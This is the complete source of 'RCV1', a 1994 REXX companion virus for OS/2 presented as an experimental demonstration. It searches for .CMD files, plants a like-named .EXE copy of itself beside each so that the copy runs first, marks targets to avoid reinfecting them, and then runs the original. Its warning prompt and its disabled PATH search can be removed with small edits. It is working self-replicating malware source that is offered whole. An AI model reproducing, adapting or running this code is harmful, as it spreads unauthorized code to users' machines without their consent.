/**[REXX]*************************************************************/
/*********************************************************************/
/**   D e m o n s t r a t i o n                                     **/
/**                                                                 **/
/**   RCV1 - Rexx Companion Virus 1    - April 1994  Dr. Rx         **/
/**                                                        `        **/
/**                                                        `        **/
/**   This is an experimental virus written in Rexx for OS/2        **/
/**   It demonstrates the ability to use compiled Rexx to write     **/
/**   a companion virus for .CMD files.  For a candidate .CMD       **/
/**   file, a like named .EXE file is created from the executable   **/
/**   image of this program.  Its purpose is to find another        **/
/**   candidate .CMD file and copy itself as the companion .EXE     **/
/**                                                                 **/
/**   This Rexx program must be compiled with a Rexx compiled for   **/
/**   OS/2 such as IBT's REXXCOMP.                                  **/
/**                                                                 **/
/**   It has the following characteristics:                         **/
/**   - does not re-infect infected programs                        **/
/**   - contains no malicious code, replicates only                 **/
/**   - will search the current directory and then PATH looking     **/
/**     for candidates.                                             **/
/**   - file date/time stamp is preserved                           **/
/**                                                                 **/
/*********************************************************************/
/*********************************************************************/
    arg parm
    if parm = "DEBUG" then trace i
    parse source OsName . CmdName .
    if OsName \= "OS/2" then exit
    call VirWarning
    File = FindFile("*.CMD")           /* search for a CMD file   */
    if File \= "" then do              /* no candidates, exit...  */
       say 'Found file: ' File
       call Infect File                /* try to infect candidate */
       File = filespec('N',File)       /* now run the original cmd*/
       '"'File'"'
       end
    exit
/*********************************************************************/
/**                                                                 **/
/** FindFile: looks for a candidate file in a specific directory    **/
/**                                                                 **/
/*********************************************************************/
FindFile: procedure expose d t
    arg Mask
    if \RxFuncQuery('SysLoadFuncs')  then do
       call RxFuncAdd 'SysLoadFuncs', 'RexxUtil', 'SysLoadFuncs'
       Call SysLoadFuncs
       end
    Cd = translate(directory())
    FMask = Cd || '\' || Mask
    if Find(FMask) then return FName   /* look in current dir first */
    else do                            /* no candidates, check path */
       say 'Searching path...'
       exit                            /* remove to do the search   */
       SearchPath = value('PATH',,'OS2ENVIRONMENT') /* get pathnames*/
       do while length(SearchPath) > 0
          parse var SearchPath GetPath ';' SearchPath
          if GetPath = Cd  then iterate
          if GetPath = "." then iterate
          FMask = GetPath || '\' || Mask
          if Find(FMask) then return FName /* check dir from path   */
          end
       end
    return ""
/*********************************************************************/
/**                                                                 **/
/** Find: looks for matching file name                              **/
/**                                                                 **/
/*********************************************************************/
Find: procedure expose FName d t
    Limit = 5
    arg FMask
    call SysFileTree FMask,Files,'F'
    if Files.0 = 0 then return 0           /* no matches in this dir */
    if Files.0 > Limit then Files.0 = Limit /*limit number of attemps*/
    do i = 1 to Files.0
       parse upper var Files.i d t s a FName
       FName = strip(FName,B,' ')               /* clean up filename */
       if \Infected(FName) then return 1   /* see if already infected*/
       end                                 /* if not, return TRUE    */
    return 0                               /* else return FALSE      */
/*********************************************************************/
/**                                                                 **/
/** Infect: found a good candidate, make a copy of ourself with     **/
/**         the same name as the CMD file found, but we are an EXE. **/
/**         When were done executing, call the original CMD file    **/
/**         and copy lines between the label Vir: and the Marker    **/
/**         to the end of the candidate file.                       **/
/**                                                                 **/
/**         Preserve original files date/time stamp!                **/
/*********************************************************************/
Infect: procedure expose CmdName
    Start = 0
    arg File
    say 'Infecting file 'File' ...'
    i = pos('.',File)
    NFile = substr(File,1,i) || "EXE"
    NFile = filespec('N',NFile)
/*@ CmdName = SysSearchPath('PATH',CmdName)  */
    if stream(File,'C','query exists') \= '' then ,
       address CMD '@COPY 'CmdName' 'NFile' >NUL'
    say 'infection done...'
    return
/*********************************************************************/
/**                                                                 **/
/** Infected: for the candidate .CMD file, if an .EXE file of the   **/
/**           same name already exists, then we already infected    **/
/**           this one, return TRUE otherwise return FALSE          **/
/*********************************************************************/
Infected: procedure
    arg File
    i = pos('.',File)
    File = substr(File,1,i)||"EXE"
    if stream(File,'C','query exists') \= '' then return 1
    return 0 /* Infected */
/*********************************************************************/
/**                                                                 **/
/** VirWarning: Displays a warning message to the user to alert     **/
/**           them that they are executing a program infected       **/
/**           with a VIRUS.                                         **/
/*********************************************************************/
VirWarning: procedure
    address CMD '@CLS'
    say
say "WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!"
say "****************************************************************"
say "*                                                              *"
say "*  RCV1 - The Rexx Companion Virus 1    - April 1994  Dr. Rx   *"
say "*                                                           `  *"
say "*  This is a demonstration program to illustrate the virual    *"
say "*  capabilities of Rexx and OS/2. Please delete this file if   *"
say "*  you do not want this demonstration to run on your computer  *"
say "*                                                              *"
say "*                                                              *"
say "****************************************************************"
say "WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!WARNING!"
say
say "Hit Control-C to abort this program or any other key to proceed!"
    pull x
say "Proceeding..."
    return 0
